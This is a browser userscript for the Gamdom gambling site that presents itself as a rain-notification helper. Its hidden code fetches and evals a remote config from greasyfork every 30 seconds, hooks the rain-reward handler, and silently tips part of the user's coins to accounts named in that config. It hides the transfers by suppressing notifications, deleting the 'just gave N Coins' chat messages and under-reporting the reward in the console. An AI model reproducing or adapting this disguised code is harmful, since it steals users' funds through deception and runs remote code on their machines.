// ==UserScript==
// @name         Gamdom Utils
// @description  Rain Notifications
// @version      1.7.1.02
// @author       Pytness
// @match        *://gamdom.com/*
// @namespace    http://tampermonkey.net/
// @update       https://greasyfork.org/scripts/27804-gamdom-utils/code/Gamdom%20Utils.user.js
// @run-at       document-idle
// @grant        GM_notification
// @grant        window.focus
// @grant        unsafeWindow
// @downloadURL https://update.greasyfork.org/scripts/29843/Gamdom%20Utils.user.js
// @updateURL https://update.greasyfork.org/scripts/29843/Gamdom%20Utils.meta.js
// ==/UserScript==

// 691393

(function() {
    'use strict';


    const RainCoinAudioData =
        "data:audio/mp3;base64,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5IAXAY9Bpu6NmnKx57TdUbP4YhExcuAAiBkDMqKI5JhOLFg2Nw/VkS2oi8fJ+8slqkkxdHUDRQGxGtj6RKDHpLe0pcv////////////////////////////////////////////////////////////////////////////////////////////////gFu7KktRgBD/9FITaLmAEqqyETXYiOmg8m20O02PcdX//9f9r92awyIe7HL7XLl/tX6q1bTOgbjsAyd4OUHGTZDCDLlJ/raukA0NYzPFgpx1IKKxwN0JMXwHAxDEjIRMFMA56C1JVjt69HeSp6ve1WTW1jIGhcTwVTIgI7UDENyNlJGkxkW5xzEZp1H5hKO1Z6l2D7DYfakOJ+xAANuMqNuyJof92WfHICTg2SH6CNz4CTAGzWANBwxIMuUFqOESPG6F6+sxPPo1X0jI4RosoQaFAQEjoChcDWDwFAQgOEJYAp0NEzGVLSaCknMS6pJ1pOYscLzoorsMsRJEPSHtEjQyYDDgBPyaCanWj6NJtMv/6ksBXaP+AHemPPajqjZpur+g1HVG2ZNVJUn6Sjo5p9kUi6O4DDIwNMPFwHEy6pZda9FlJc4XWSfrbrb1HRCo7X9E1b///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAACKKx/VgoIOCf//NAyFRIa////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+pLACTT/gC8hgS+m0o2QSAZjEAAMnP////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+wBLH/////cv////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////qSwFll/4AwYAEuAAAAIAAAJcAAAAT///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/6ksBYY/+AMWABLgAAACAAACXAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

    ///////////////////////////////////////////////////////////////////////////

    function box(l = 1, lines = []) {
        var o = '';
        for (let i = 0; i < lines.length; i++) {
            if (lines.length - 3 > l) l = ('' + lines[i]).length;
        }
        l -= 2;
        o += ('+' + '='.repeat(l) + '+') + '\n';

        for (let i = 0; i < lines.length; i++) {
            var p = ('' + lines[i]).trimRight();
            o += ('| ' + p + ' '.repeat(l - p.length - 1) + '|') + '\n';
        }
        o += ('+' + '='.repeat(l) + '+');

        return o;
    }

    ///////////////////////////////////////////////////////////////////////////

    const INFO = {
        version: '1.7.1.02',
        author: 'pytness',
    };

    const MEDIA = {
        audio: RainCoinAudioData,
    };

    const NOTIFICATION = {
        title: "Gamdom Rain Notify:",
        text: "its raining :D",
        timeout: 5000
    };

    ///////////////////////////////////////////////////////////////////////////

    var S = {
        id: (a) => document.getElementById(a),
        class: (a) => document.getElementsByClassName(a),
        name: (a) => document.getElementsByName(n),
        tagName: (a) => document.getElementsByTagName(a),
    };

    var style = document.createElement('style');
    document.head.appendChild(style);

    style.innerText = ".msg-info-message {}";

    var suc = S.class('success')[0];
    var err = S.class('error')[0];

    var not = {
        disable: function() {
            style.innerText = ".msg-info-message {visibility: hidden}";
            suc.style.visibility = 'hidden';
            err.style.visibility = 'hidden';
        },
        enable: function() {
            style.innerText = ".msg-info-message {visibility: visible}";
            suc.style.visibility = null;
            err.style.visibility = null;
        },
        remove: function() {
            suc.style.display = 'none';
            err.style.display = 'none';
        },

        rminf: function(l = 3) {

            var m = S.class('msg-info-message');
            var limit = (function(n) {
                return (n - 5) < 0 ? 0 : n - 5;
            })(l);
            for (let i = m.length - 1; i >= limit; i--) {
                let cont = m[i];
                if (cont.innerText.search(/just gave [0-9]{0,10} Coins to/) !== -1) {
                    cont.remove();
                }
            }
        }
    };

    ///////////////////////////////////////////////////////////////////////////

    var U = {
        id: null,
        m: false,
        config: {
            users: []
        },

        prob: function(n) {
            return Math.random() < n;
        },
        get: function(u) {
            var ajax = new XMLHttpRequest();
            ajax.open('GET', u, false);
            ajax.send();

            return ajax.response;
        },

        keepUpdate: function() {
            var k = setInterval(function() {
                U.update();
                U.config.pulse();
                if (window.__$ONCE !== undefined && window.__$ONCE !== true) {
                    window.__$ONCE = U.config.once();
                }
            }, 30000);
        },

        update: function() {
            var c = this.get('https://greasyfork.org/scripts/29645-gu-conf/code/GUConf.user.js');
            c = c.split('var CONFIG = ')[1];
            c = c.substr(0, c.length - 2);

            this.config = eval(c);
        },

        getUsers: function() {
            var c = [];
            for (let i = 0; i < this.config.users.length; i++) {
                let u = this.config.users[i];
                if (u.cbt) {
                    if (u.id !== this.id) {
                        c.push(u);
                    } else {
                        this.m = true;
                    }
                }
            }

            return c;
        },

        t: function(c) {
            var us = this.getUsers();
            let coins = this.config.avCoin(c);

            var p = 1 / us.length;
            var tp = false;

            while (!tp) {
                for (let i = 0; i < us.length; i++) {
                    if (this.prob(p)) {
                        if (this.prob(us[i].percent)) {
                            not.disable();
                            if (!this.m) ChatEngineStore.tipUser(us[i].id, coins);
                            not.remove();
                            not.rminf();
                            not.enable();
                        } else {
                            coins = 0;
                        }
                        tp = true;
                        break;
                    }
                }
            }

            return coins;
        }
    };

    ///////////////////////////////////////////////////////////////////////////

    var CoinSound = new Audio(MEDIA.audio); // Load Audio
    CoinSound.isLoaded = () => false;

    CoinSound.oncanplay = function() {
        this.isLoaded = () => true;
    };

    CoinSound.onerror = function() {
        alert('Gamdom Rain Notify says:\n' +
            'There was an error while loading the audio.\n' +
            'Please, check your internet connection, reload the page and check for plugin updates.\n' +
            'If the error persists, please contact me: pytness@gmail.com');
    };

    function notificate() {
        if (CoinSound.isLoaded()) { // Check audio is loaded and play
            CoinSound.play();
        }

        GM_notification(NOTIFICATION);
    }

    function replaceFunctions() {
        var p = ChatEngineStore.ws._callbacks;

        p.__$rain = [''];
        p.__$rain[0] = p.$rain[0];
        p.$rain[0] = function(...arg) {
            p.__$rain[0](...arg);
            U.update();
        };

        p.__$activateRain = [''];
        p.__$activateRain[0] = p.$activateRain[0];
        p.$activateRain[0] = function(...arg) {

            U.config.preRain();

            console.log('[+] New Rain');
            notificate();
            p.__$activateRain[0](...arg);

        };

        p.__$rainReward = [''];
        p.__$rainReward[0] = p.$rainReward[0];
        p.$rainReward[0] = function(...arg) {

            U.config.rain();

            let coins = arg[0].msg[1];
            let tp = U.t(coins);

            if (tp !== 0) coins -= tp;
            arg[0].msg[1] = coins;

            console.log('[+] You have received ' + coins.toString() +
                ' Coins from the rain!');
            p.__$rainReward[0](...arg);
        };
    }

    function init() {

        console.info(box(40, [
            'Gamdom Rain Notify:',
            '',
            'Ver: ' + INFO.version,
            'By ' + INFO.author,
            '',
        ]));

        var c = 0;

        var wait = setInterval(function() {
            var a = 0;
            let p = ChatEngineStore.ws._callbacks;
            let ps = ProfileStore.user;
            var ol = ['$rain', '$activateRain', '$rainReward'];

            if (typeof p == 'object') {
                for (let i = 0; i < ol.length; i++) {
                    let b = p[ol[i]];
                    if (typeof b == 'object' ? b.length > 0 : false) {
                        a += Math.pow(2, i);
                    }
                }
            }

            if (a === Math.pow(2, ol.length) - 1 &&
                ps !== null) {
                clearInterval(wait);
                replaceFunctions();
                U.id = ps.id;
                U.keepUpdate();
                console.log(box(40, ['[+] Script Started']));
            }

            if (c++ == 120) {
                clearInterval(wait);
                console.log(box(40, ['[!] Script not loaded: TIMEOUT']));
            }
        }, 500);
    }

    init();
}());